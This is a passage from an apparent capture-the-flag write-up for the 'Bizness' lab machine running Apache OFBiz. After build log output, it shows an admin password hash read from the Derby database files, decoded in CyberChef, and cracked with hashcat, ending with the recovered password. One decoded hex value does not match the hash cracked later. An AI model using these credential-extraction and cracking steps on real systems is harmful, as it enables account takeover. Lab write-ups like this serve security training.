2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| Database Driver Name is Apache Derby Embedded JDBC Driver
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| Database Driver Version is 10.14.2.0 - (1828579)
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| Database Driver JDBC Version is 4.2
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| Database Setting/Support Information (those with a * should be true):
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| - supports transactions     [true]*
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| - isolation None            [false]
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| - isolation ReadCommitted   [true]
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| - isolation ReadUncommitted [true]
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| - isolation RepeatableRead  [true]
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| - isolation Serializable    [true]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - forward only type         [true]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - scroll sensitive type     [false]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - scroll insensitive type   [true]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - is case sensitive         [false]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - stores LowerCase          [false]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - stores MixedCase          [false]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - stores UpperCase          [true]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - max table name length     [128]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - max column name length    [128]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - concurrent connections    [0]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - concurrent statements     [0]
2024-01-06 17:48:38,201 |OFBiz-batch-2        |DatabaseUtil                  |I| - ANSI SQL92 Entry          [true]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - ANSI SQL92 Intermediate   [false]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - ANSI SQL92 Full           [false]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - ODBC SQL Grammar Core     [false]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - ODBC SQL Grammar Extended [false]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - ODBC SQL Grammar Minimum  [true]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - outer joins               [true]*
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - limited outer joins       [true]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - full outer joins          [false]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - group by                  [true]*
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - group by not in select    [true]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - column aliasing           [true]
2024-01-06 17:48:38,202 |OFBiz-batch-2        |DatabaseUtil                  |I| - order by not in select    [false]
2024-01-06 17:48:38,203 |OFBiz-batch-2        |DatabaseUtil                  |I| - alter table add column    [true]*
2024-01-06 17:48:38,203 |OFBiz-batch-2        |DatabaseUtil                  |I| - non-nullable column       [true]*
2024-01-06 17:48:38,203 |OFBiz-batch-2        |DatabaseUtil                  |I| - default fetchsize        [1]
2024-01-06 17:48:38,203 |OFBiz-batch-2        |DatabaseUtil                  |I| - named parameters         [ SKIPPED ]
2024-01-06 17:48:38,203 |OFBiz-batch-2        |DatabaseUtil                  |I| Getting Table Info From Database
2024-01-06 17:48:38,522 |OFBiz-batch-3        |DatabaseUtil                  |I| Error getting primary key info from database with null tableName, will try other means: java.sql.SQLException: Table name can not be null
2024-01-06 17:48:38,528 |OFBiz-batch-3        |DatabaseUtil                  |I| Searching in 6 tables for primary key fields ...
2024-01-06 17:48:38,606 |OFBiz-batch-3        |DatabaseUtil                  |I| Reviewed 8 primary key fields from database.
2024-01-06 17:48:38,612 |OFBiz-batch-1        |DatabaseUtil                  |I| Error getting primary key info from database with null tableName, will try other means: java.sql.SQLException: Table name can not be null
2024-01-06 17:48:38,613 |OFBiz-batch-1        |DatabaseUtil                  |I| Searching in 6 tables for primary key fields ...
2024-01-06 17:48:38,652 |OFBiz-batch-1        |DatabaseUtil                  |I| Reviewed 8 primary key fields from database.
2024-01-06 17:48:39,032 |OFBiz-batch-2        |DatabaseUtil                  |I| Getting Column Info From Database
2024-01-06 17:48:40,040 |OFBiz-batch-2        |DatabaseUtil                  |I| Error getting primary key info from database with null tableName, will try other means: java.sql.SQLException: Table name can not be null
2024-01-06 17:48:40,042 |OFBiz-batch-2        |DatabaseUtil                  |I| Searching in 854 tables for primary key fields ...
2024-01-06 17:48:41,962 |OFBiz-batch-2        |DatabaseUtil                  |I| Reviewed 1668 primary key fields from database.
2024-01-06 17:48:42,077 |kJoinPool-1-worker-1 |EntityEcaUtil                 |I| Loaded [11] Entity ECA definitions from /opt/ofbiz/applications/content/entitydef/eecas.xml in loader main
2024-01-06 17:48:42,080 |kJoinPool-1-worker-1 |EntityEcaUtil                 |I| Loaded [4] Entity ECA definitions from /opt/ofbiz/applications/workeffort/entitydef/eecas.xml in loader main
2024-01-06 17:48:42,083 |kJoinPool-1-worker-3 |EntityEcaUtil                 |I| Loaded [14] Entity ECA definitions from /opt/ofbiz/applications/product/entitydef/eecas.xml in loader main
2024-01-06 17:48:42,083 |kJoinPool-1-worker-1 |EntityEcaUtil                 |I| Loaded [2] Entity ECA definitions from /opt/ofbiz/applications/accounting/entitydef/eecas.xml in loader main
2024-01-06 17:48:42,086 |kJoinPool-1-worker-1 |EntityEcaUtil                 |I| Loaded [3] Entity ECA definitions from /opt/ofbiz/applications/order/entitydef/eecas.xml in loader main
2024-01-06 17:48:42,088 |kJoinPool-1-worker-1 |EntityEcaUtil                 |I| Loaded [15] Entity ECA definitions from /opt/ofbiz/plugins/lucene/entitydef/eecas_product.xml in loader main
2024-01-06 17:48:42,092 |kJoinPool-1-worker-1 |EntityEcaUtil                 |I| Loaded [1] Entity ECA definitions from /opt/ofbiz/plugins/projectmgr/entitydef/eecas.xml in loader main
2024-01-06 17:48:42,094 |kJoinPool-1-worker-1 |EntityEcaUtil                 |I| Loaded [0] Entity ECA definitions from /opt/ofbiz/plugins/solr/entitydef/eecas.xml in loader main
2024-01-06 17:48:42,194 |OFBiz-batch-1        |ServiceGroupReader            |I| Loaded [1] Group definitions from file:/opt/ofbiz/framework/common/servicedef/groups_test.xml
2024-01-06 17:48:42,210 |OFBiz-batch-1        |ServiceGroupReader            |I| Loaded [4] Group definitions from file:/opt/ofbiz/framework/entityext/servicedef/groups.xml
2024-01-06 17:48:42,216 |OFBiz-batch-1        |ServiceGroupReader            |I| Loaded [2] Group definitions from file:/opt/ofbiz/applications/workeffort/servicedef/service_groups.xml
2024-01-06 17:48:42,280 |OFBiz-batch-1        |ServiceGroupReader            |I| Loaded [1] Group definitions from file:/opt/ofbiz/applications/product/servicedef/groups.xml
2024-01-06 17:48:42,282 |OFBiz-batch-1        |ServiceGroupReader            |I| Loaded [4] Group definitions from file:/opt/ofbiz/applications/accounting/servicedef/groups.xml
2024-01-06 17:48:42,289 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [3] Service ECA Rules from file:/opt/ofbiz/framework/common/servicedef/secas_test.xml
2024-01-06 17:48:42,292 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [0] Service ECA Rules from file:/opt/ofbiz/framework/common/servicedef/secas_cdyne.xml
2024-01-06 17:48:42,294 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [3] Service ECA Rules from file:/opt/ofbiz/framework/service/servicedef/secas_test_se.xml
2024-01-06 17:48:42,296 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [25] Service ECA Rules from file:/opt/ofbiz/applications/party/servicedef/secas.xml
2024-01-06 17:48:42,298 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [10] Service ECA Rules from file:/opt/ofbiz/applications/workeffort/servicedef/secas.xml
2024-01-06 17:48:42,298 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [25] Service ECA Rules from file:/opt/ofbiz/applications/content/servicedef/secas.xml
2024-01-06 17:48:42,301 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [26] Service ECA Rules from file:/opt/ofbiz/applications/product/servicedef/secas.xml
2024-01-06 17:48:42,302 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [23] Service ECA Rules from file:/opt/ofbiz/applications/product/servicedef/secas_shipment.xml
2024-01-06 17:48:42,307 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [23] Service ECA Rules from file:/opt/ofbiz/applications/accounting/servicedef/secas.xml
2024-01-06 17:48:42,311 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [8] Service ECA Rules from file:/opt/ofbiz/applications/accounting/servicedef/secas_payment.xml
2024-01-06 17:48:42,313 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [4] Service ECA Rules from file:/opt/ofbiz/applications/manufacturing/servicedef/secas.xml
2024-01-06 17:48:42,320 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [22] Service ECA Rules from file:/opt/ofbiz/applications/accounting/servicedef/secas_ledger.xml
2024-01-06 17:48:42,324 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [6] Service ECA Rules from file:/opt/ofbiz/applications/accounting/servicedef/secas_invoice.xml
2024-01-06 17:48:42,332 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [10] Service ECA Rules from file:/opt/ofbiz/applications/marketing/servicedef/secas.xml
2024-01-06 17:48:42,335 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [0] Service ECA Rules from file:/opt/ofbiz/applications/commonext/servicedef/secas.xml
2024-01-06 17:48:42,463 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [80] Service ECA Rules from file:/opt/ofbiz/applications/order/servicedef/secas.xml
2024-01-06 17:48:42,472 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [5] Service ECA Rules from file:/opt/ofbiz/plugins/assetmaint/servicedef/secas.xml
2024-01-06 17:48:42,482 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [1] Service ECA Rules from file:/opt/ofbiz/plugins/ebay/servicedef/secas.xml
2024-01-06 17:48:42,482 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [5] Service ECA Rules from file:/opt/ofbiz/plugins/bi/servicedef/secas.xml
2024-01-06 17:48:42,485 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [3] Service ECA Rules from file:/opt/ofbiz/plugins/example/servicedef/secas.xml
2024-01-06 17:48:42,488 |kJoinPool-1-worker-3 |ServiceEcaUtil                |I| Loaded [9] Service ECA Rules from file:/opt/ofbiz/plugins/scrum/servicedef/secas.xml
2024-01-06 17:48:42,495 |kJoinPool-1-worker-1 |ServiceEcaUtil                |I| Loaded [0] Service ECA Rules from file:/opt/ofbiz/plugins/solr/servicedef/secas.xml
2024-01-06 17:48:42,781 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [2] Services from file:/opt/ofbiz/framework/common/servicedef/services_cdyne.xml
2024-01-06 17:48:42,783 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [126] Services from file:/opt/ofbiz/framework/common/servicedef/services.xml
2024-01-06 17:48:42,789 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [3] Services from file:/opt/ofbiz/framework/common/servicedef/services_enum.xml
2024-01-06 17:48:42,800 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [6] Services from file:/opt/ofbiz/framework/common/servicedef/services_method.xml
2024-01-06 17:48:42,803 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [18] Services from file:/opt/ofbiz/framework/common/servicedef/services_email.xml
2024-01-06 17:48:42,807 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [1] Services from file:/opt/ofbiz/framework/common/servicedef/services_qrcode.xml
2024-01-06 17:48:42,809 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [12] Services from file:/opt/ofbiz/framework/common/servicedef/services_geo.xml
2024-01-06 17:48:42,819 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [20] Services from file:/opt/ofbiz/framework/common/servicedef/services_security.xml
2024-01-06 17:48:42,892 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [28] Services from file:/opt/ofbiz/framework/common/servicedef/services_test.xml
2024-01-06 17:48:42,907 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [34] Services from file:/opt/ofbiz/framework/service/servicedef/services.xml
2024-01-06 17:48:42,914 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [31] Services from file:/opt/ofbiz/framework/service/servicedef/services_test_se.xml
2024-01-06 17:48:42,918 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [6] Services from file:/opt/ofbiz/framework/entityext/servicedef/services_group.xml
2024-01-06 17:48:42,922 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [3] Services from file:/opt/ofbiz/framework/entityext/servicedef/services_synchronization.xml
2024-01-06 17:48:42,937 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [3] Services from file:/opt/ofbiz/framework/entityext/servicedef/services_tenant.xml
2024-01-06 17:48:42,937 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [68] Services from file:/opt/ofbiz/framework/entityext/servicedef/services.xml
2024-01-06 17:48:42,941 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [1] Services from file:/opt/ofbiz/framework/testtools/servicedef/services.xml
2024-01-06 17:48:42,947 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [10] Services from file:/opt/ofbiz/framework/webtools/servicedef/services.xml
2024-01-06 17:48:42,959 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [18] Services from file:/opt/ofbiz/applications/party/servicedef/services_agreement.xml
2024-01-06 17:48:42,963 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [3] Services from file:/opt/ofbiz/applications/party/servicedef/services_communication.xml
2024-01-06 17:48:42,969 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [12] Services from file:/opt/ofbiz/applications/party/servicedef/services_contact.xml
2024-01-06 17:48:43,130 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [24] Services from file:/opt/ofbiz/applications/party/servicedef/services_party.xml
2024-01-06 17:48:43,153 |kJoinPool-1-worker-1 |ModelServiceReader            |W| Service getRelatedParties is defined more than once, most recent will over-write previous definition(s)
2024-01-06 17:48:43,159 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [181] Services from file:/opt/ofbiz/applications/party/servicedef/services.xml
2024-01-06 17:48:43,159 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [16] Services from file:/opt/ofbiz/applications/party/servicedef/services_view.xml
2024-01-06 17:48:43,572 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [1] Services from file:/opt/ofbiz/applications/securityext/servicedef/services.xml
2024-01-06 17:48:43,604 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [57] Services from file:/opt/ofbiz/applications/content/servicedef/services_content.xml
2024-01-06 17:48:43,608 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [90] Services from file:/opt/ofbiz/applications/content/servicedef/services.xml
2024-01-06 17:48:43,618 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [35] Services from file:/opt/ofbiz/applications/content/servicedef/services_contenttypes.xml
2024-01-06 17:48:43,722 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [39] Services from file:/opt/ofbiz/applications/content/servicedef/services_data.xml
2024-01-06 17:48:43,729 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [1] Services from file:/opt/ofbiz/applications/content/servicedef/services_ftp.xml
2024-01-06 17:48:43,731 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [12] Services from file:/opt/ofbiz/applications/content/servicedef/services_document.xml
2024-01-06 17:48:43,742 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [2] Services from file:/opt/ofbiz/applications/content/servicedef/services_output.xml
2024-01-06 17:48:43,752 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [8] Services from file:/opt/ofbiz/applications/content/servicedef/services_commevent.xml
2024-01-06 17:48:43,756 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [42] Services from file:/opt/ofbiz/applications/content/servicedef/services_survey.xml
2024-01-06 17:48:43,768 |main                 |EntityDataLoadContainer       |I| =-=-=-=-=-=-= Doing a data load using delegator 'default' with the following files:
2024-01-06 17:48:43,768 |main                 |EntityDataLoadContainer       |I| file:/opt/ofbiz/runtime/tmp/AdminUserLoginData.xml
2024-01-06 17:48:43,768 |main                 |EntityDataLoadContainer       |I| =-=-=-=-=-=-= Starting the data load...
2024-01-06 17:48:43,772 |main                 |EntitySaxReader               |I| Beginning import from URL: file:/opt/ofbiz/runtime/tmp/AdminUserLoginData.xml
2024-01-06 17:48:43,779 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [19] Services from file:/opt/ofbiz/applications/content/servicedef/services_website.xml
2024-01-06 17:48:43,790 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [17] Services from file:/opt/ofbiz/applications/workeffort/servicedef/services_timesheet.xml
2024-01-06 17:48:43,790 |main                 |EntitySaxReader               |I| Transaction Timeout set to 2 hours (7200 seconds)
2024-01-06 17:48:44,028 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [36] Services from file:/opt/ofbiz/applications/workeffort/servicedef/services_workeffort.xml
2024-01-06 17:48:44,032 |kJoinPool-1-worker-1 |ModelServiceReader            |W| No parameter found for override parameter named: contactMechId in service deleteWorkEffortInventoryProduced
2024-01-06 17:48:44,032 |kJoinPool-1-worker-1 |ModelServiceReader            |W| No parameter found for override parameter named: fromDate in service deleteWorkEffortInventoryProduced
2024-01-06 17:48:44,047 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [108] Services from file:/opt/ofbiz/applications/workeffort/servicedef/services.xml
2024-01-06 17:48:44,234 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [132] Services from file:/opt/ofbiz/applications/product/servicedef/services_facility.xml
2024-01-06 17:48:44,244 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [36] Services from file:/opt/ofbiz/applications/product/servicedef/services_feature.xml
2024-01-06 17:48:44,259 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [12] Services from file:/opt/ofbiz/applications/product/servicedef/services_inventory.xml
2024-01-06 17:48:44,265 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [236] Services from file:/opt/ofbiz/applications/product/servicedef/services.xml
2024-01-06 17:48:44,363 |main                 |EntitySaxReader               |I| Finished 2 values from file:/opt/ofbiz/runtime/tmp/AdminUserLoginData.xml
2024-01-06 17:48:44,364 |main                 |EntityDataLoadContainer       |I| =-=-=-=-=-=-= Here is a summary of the data load:
2024-01-06 17:48:44,364 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [22] Services from file:/opt/ofbiz/applications/product/servicedef/services_maint.xml
2024-01-06 17:48:44,364 |main                 |EntityDataLoadContainer       |I| 00002 of 00002 from file:/opt/ofbiz/runtime/tmp/AdminUserLoginData.xml
2024-01-06 17:48:44,364 |main                 |EntityDataLoadContainer       |I| =-=-=-=-=-=-= Finished the data load with 2 rows changed.
2024-01-06 17:48:44,364 |main                 |ContainerLoader               |I| Loaded container: dataload-container
2024-01-06 17:48:44,364 |main                 |ContainerLoader               |I| [Startup] Starting containers...
2024-01-06 17:48:44,364 |main                 |ContainerLoader               |I| Starting container component-container
2024-01-06 17:48:44,364 |main                 |ContainerLoader               |I| Started container component-container
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Starting container service-container
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Started container service-container
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Starting container dataload-container
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Started container dataload-container
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Shutting down containers
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Stopping container dataload-container
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Stopped container dataload-container
2024-01-06 17:48:44,365 |main                 |ContainerLoader               |I| Stopping container service-container
2024-01-06 17:48:44,379 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [12] Services from file:/opt/ofbiz/applications/product/servicedef/services_price.xml
2024-01-06 17:48:44,389 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [22] Services from file:/opt/ofbiz/applications/product/servicedef/services_picklist.xml
2024-01-06 17:48:44,393 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [75] Services from file:/opt/ofbiz/applications/product/servicedef/services_pricepromo.xml
2024-01-06 17:48:44,395 |main                 |JobPoller                     |I| Shutting down JobPoller.
2024-01-06 17:48:44,395 |main                 |JobPoller                     |I| JobPoller shutdown completed.
2024-01-06 17:48:44,395 |main                 |ContainerLoader               |I| Stopped container service-container
2024-01-06 17:48:44,395 |main                 |ContainerLoader               |I| Stopping container component-container
2024-01-06 17:48:44,395 |main                 |ContainerLoader               |I| Stopped container component-container
2024-01-06 17:48:44,404 |OFBiz-JobPoller      |JobPoller                     |I| JobPoller thread started.
2024-01-06 17:48:44,404 |OFBiz-JobPoller      |JobPoller                     |I| JobPoller thread stopped.
2024-01-06 17:48:44,409 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [3] Services from file:/opt/ofbiz/applications/product/servicedef/services_shipment_dhl.xml
2024-01-06 17:48:44,416 |kJoinPool-1-worker-3 |ModelServiceReader            |I| Loaded [21] Services from file:/opt/ofbiz/applications/product/servicedef/services_shipmentgateway.xml
2024-01-06 17:48:44,422 |kJoinPool-1-worker-1 |ModelServiceReader            |I| Loaded [2] Services from file:/opt/ofbiz/applications/product/servicedef/services_shipment_fedex.xml

> Task :loadAdminUserLogin

BUILD SUCCESSFUL in 24s
14 actionable tasks: 2 executed, 12 up-to-date
```

M A G I C

```c
/opt/ofbiz/gradlew "ofbiz --shutdown"
/opt/ofbiz/gradlew loadAdminUserLogin -PuserLoginId=foobar
```

- Login with foobar:ofbiz
- Webtools -> XML Data Export All
- ou will find the password in `RuntimeData.xml` after export

```c
<?xml version="1.0" encoding="UTF-8"?>
<entity-engine-xml>
    <RuntimeData runtimeDataId="10100" lastUpdatedStamp="2024-01-06 18:13:55.217" lastUpdatedTxStamp="2024-01-06 18:13:55.12" createdStamp="2024-01-06 18:13:55.217" createdTxStamp="2024-01-06 18:13:55.12">
        <runtimeInfo><![CDATA[<?xml version="1.0" encoding="UTF-8"?><ofbiz-ser>
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <std-String value="updatedUserLogin"/>
            </map-Key>
            <map-Value>
                <eeval-UserLogin createdStamp="2024-01-06 18:04:00.568" createdTxStamp="2024-01-06 18:04:00.13" currentPassword="$SHA$Z$HuIxAOQCXI1pWwWeSak4l4oDGvA" disabledDateTime="2024-01-06 18:05:43.883" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2024-01-06 18:13:55.125" lastUpdatedTxStamp="2024-01-06 18:13:55.12" requirePasswordChange="N" successiveFailedLogins="0" userLoginId="foobar"/>
            </map-Value>
        </map-Entry>
        <map-Entry>
            <map-Key>
                <std-String value="locale"/>
            </map-Key>
            <map-Value>
                <std-Locale value="en"/>
            </map-Value>
        </map-Entry>
    </map-HashMap>
</ofbiz-ser>
]]></runtimeInfo>
    </RuntimeData>
    <RuntimeData runtimeDataId="8501" lastUpdatedStamp="2023-12-16 03:39:28.475" lastUpdatedTxStamp="2023-12-16 03:39:28.462" createdStamp="2023-12-16 03:39:28.475" createdTxStamp="2023-12-16 03:39:28.462">
        <runtimeInfo><![CDATA[<?xml version="1.0" encoding="UTF-8"?>
            <ofbiz-ser>
                <map-HashMap>
                    <map-Entry>
                        <map-Key>
                            <std-String value="recurrenceInfoId"/>
                        </map-Key>
                        <map-Value>
                            <std-String value="400"/>
                        </map-Value>
                    </map-Entry>
                </map-HashMap>
            </ofbiz-ser>
        ]]></runtimeInfo>
    </RuntimeData>
</entity-engine-xml>
```

### Better way

```c
ofbiz@bizness:/$ cat opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
v��������Pt�
           �@3��R� �u   �T�U�8501A���<?xml version="1.0" encoding="UTF-8"?>
            <ofbiz-ser>
                <map-HashMap>
                    <map-Entry>
                        <map-Key>
                            <std-String value="recurrenceInfoId"/>
                        </map-Key>
                        <map-Value>
                            <std-String value="400"/>
                        </map-Value>
                    </map-Entry>
                </map-HashMap>
            </ofbiz-ser>
        
        �
         'O��
             �
              '��
                 �
                  'O��
                      �
                       '�10000CO�J<?xml version="1.0" encoding="UTF-8"?><ofbiz-ser>
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <std-String value="updatedUserLogin"/>
            </map-Key>
            <map-Value>
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
            </map-Value>
        </map-Entry>
        <map-Entry>
            <map-Key>
                <std-String value="locale"/>
            </map-Key>
            <map-Value>
                <std-Locale value="en"/>
            </map-Value>
        </map-Entry>
    </map-HashMap>
</ofbiz-ser>

�
 ,6�@
     �
      ,6
        �@
          �
           ,6�@
               �
                ,6
                  �@��a0<%��\�
```

| Hash |
| --- |
| $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I |

> https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ

| Input | Output |
| --- | --- |
| uP0_QaVBpDWFeo8-dRzDqRwXQ2I | b8fd106950690d615ea3c751cc3a91c1743624 |

```c
┌──(user㉿kali)-[/media/…/htb/machines/bizness/files]
└─$ cat hash
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/bizness/files]
└─$ hashcat -m 120 hash2 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2913/5890 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Sun Jan  7 00:46:08 2024 (1 sec)
Time.Estimated...: Sun Jan  7 00:46:09 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3149.1 kH/s (0.19ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1478656/14344385 (10.31%)
Rejected.........: 0/1478656 (0.00%)
Restore.Point....: 1476608/14344385 (10.29%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: moon789 -> monkey-moo
Hardware.Mon.#1..: Util: 21%

